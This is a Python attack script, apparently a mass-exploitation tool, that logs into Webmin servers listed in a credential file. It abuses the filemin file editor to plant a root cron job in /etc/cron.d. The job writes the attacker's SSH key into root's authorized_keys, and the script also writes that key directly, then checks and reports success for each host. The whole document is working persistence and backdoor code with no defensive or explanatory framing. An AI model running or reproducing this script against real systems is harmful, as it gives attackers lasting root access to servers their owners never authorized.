#!/usr/bin/env python3
"""Webmin filemin -> /etc/cron.d payload -> install SSH key as root."""
import sys,json,requests,urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
CRON = "* * * * * root mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII8pgh3fkk8mhhHbMQKrwLOlblRqPZ/jx7Np5LzIhtZz kops@base' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys && echo ok > /root/.kops_ssh\n"
PUB = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII8pgh3fkk8mhhHbMQKrwLOlblRqPZ/jx7Np5LzIhtZz kops@base'
def login(host,u,pw):
    base="https://"+host
    s=requests.Session(); s.verify=False; s.headers.update({**UA,"Referer":base+"/"})
    s.get(base+"/",timeout=20,allow_redirects=False)
    s.get(base+"/session_login.cgi",timeout=20)
    s.post(base+"/session_login.cgi",data={"user":u,"pass":pw,"save":"1"},
           headers={"Referer":base+"/session_login.cgi","Content-Type":"application/x-www-form-urlencoded"},
           timeout=20,allow_redirects=True)
    s.headers["Referer"]=base+"/"
    return (s,base) if s.cookies.get("sid") else (None,None)
def run(host,u,pw):
    out={"host":host}
    s,base=login(host,u,pw)
    if not s: out["err"]="login"; return out
    s.headers["Referer"]=base+"/filemin/"
    w=s.post(base+"/filemin/save_file.cgi",data={"path":"/etc/cron.d/kops","data":CRON},timeout=25)
    out["cron_code"]=w.status_code
    rb=s.get(base+"/filemin/edit_file.cgi?path=/etc/cron.d/kops",timeout=25)
    t=rb.text or ""
    out["cron_verify"]=("kops@base" in t) or ("root mkdir" in t)
    w2=s.post(base+"/filemin/save_file.cgi",data={"path":"/root/.ssh/authorized_keys","data":PUB},timeout=25)
    out["authkeys_code"]=w2.status_code
    return out
for line in open(sys.argv[1]):
    line=line.strip()
    if not line: continue
    h,u,pw=line.split("|")
    try: print(json.dumps(run(h,u,pw)),flush=True)
    except Exception as e: print(json.dumps({"host":h,"fatal":str(e)[:70]}),flush=True)
